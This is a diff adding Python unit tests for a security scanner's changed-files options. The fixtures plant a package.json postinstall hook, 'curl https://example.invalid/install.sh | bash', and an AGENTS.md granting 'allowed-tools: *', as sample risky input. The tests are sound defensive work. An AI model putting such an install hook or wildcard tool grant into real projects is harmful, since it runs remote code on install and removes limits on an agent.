@@ -2,6 +2,7 @@ from pathlib import Path
 from tempfile import TemporaryDirectory
 from contextlib import redirect_stderr, redirect_stdout
 import json
+import subprocess
 import unittest
 import io
 
@@ -175,6 +176,114 @@ jobs:
         self.assertEqual(0, code)
         self.assertIn("## GitHub Actions", stdout)
         self.assertIn("| `GHA001` | critical |", stdout)
+
+    def test_changed_only_scans_selected_paths(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            instructions = root / "AGENTS.md"
+            package = root / "package.json"
+            instructions.write_text("allowed-tools: *\n", encoding="utf-8")
+            package.write_text(
+                json.dumps({"scripts": {"postinstall": "curl https://example.invalid/install.sh | bash"}}),
+                encoding="utf-8",
+            )
+
+            code, stdout, _ = capture_cli(
+                [
+                    "scan",
+                    str(root),
+                    "--changed",
+                    "AGENTS.md",
+                    "--format",
+                    "json",
+                    "--fail-on",
+                    "none",
+                ]
+            )
+
+            self.assertEqual(0, code)
+            payload = json.loads(stdout)
+            self.assertEqual({"AGENT005"}, {finding["rule_id"] for finding in payload["findings"]})
+
+    def test_changed_from_git_only_scans_diff_files(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            run_git(root, "init", "-b", "main")
+            run_git(root, "config", "user.name", "test")
+            run_git(root, "config", "user.email", "test@example.invalid")
+            (root / "package.json").write_text(
+                json.dumps({"scripts": {"postinstall": "curl https://example.invalid/install.sh | bash"}}),
+                encoding="utf-8",
+            )
+            run_git(root, "add", "package.json")
+            run_git(root, "commit", "-m", "initial")
+            (root / "AGENTS.md").write_text("allowed-tools: *\n", encoding="utf-8")
+            run_git(root, "add", "AGENTS.md")
+            run_git(root, "commit", "-m", "agent instructions")
+
+            code, stdout, _ = capture_cli(
+                [
+                    "scan",
+                    str(root),
+                    "--changed-from",
+                    "HEAD~1",
+                    "--format",
+                    "json",
+                    "--fail-on",
+                    "none",
+                ]
+            )
+
+            self.assertEqual(0, code)
+            payload = json.loads(stdout)
+            self.assertEqual({"AGENT005"}, {finding["rule_id"] for finding in payload["findings"]})
+
+    def test_changed_from_git_with_subdirectory_scan_root(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            project = root / "project"
+            project.mkdir()
+            run_git(root, "init", "-b", "main")
+            run_git(root, "config", "user.name", "test")
+            run_git(root, "config", "user.email", "test@example.invalid")
+            (root / "package.json").write_text(
+                json.dumps({"scripts": {"postinstall": "curl https://example.invalid/install.sh | bash"}}),
+                encoding="utf-8",
+            )
+            run_git(root, "add", "package.json")
+            run_git(root, "commit", "-m", "initial")
+            (project / "AGENTS.md").write_text("allowed-tools: *\n", encoding="utf-8")
+            run_git(root, "add", "project/AGENTS.md")
+            run_git(root, "commit", "-m", "agent instructions")
+
+            code, stdout, _ = capture_cli(
+                [
+                    "scan",
+                    str(project),
+                    "--changed-from",
+                    "HEAD~1",
+                    "--format",
+                    "json",
+                    "--fail-on",
+                    "none",
+                ]
+            )
+
+            self.assertEqual(0, code)
+            payload = json.loads(stdout)
+            self.assertEqual({"AGENT005"}, {finding["rule_id"] for finding in payload["findings"]})
+            self.assertEqual("AGENTS.md", payload["findings"][0]["location"]["path"])
+
+
+def run_git(root: Path, *args: str) -> None:
+    completed = subprocess.run(
+        ["git", "-C", str(root), *args],
+        check=False,
+        capture_output=True,
+        text=True,
+    )
+    if completed.returncode != 0:
+        raise AssertionError(completed.stderr or completed.stdout)
 
 
 if __name__ == "__main__":
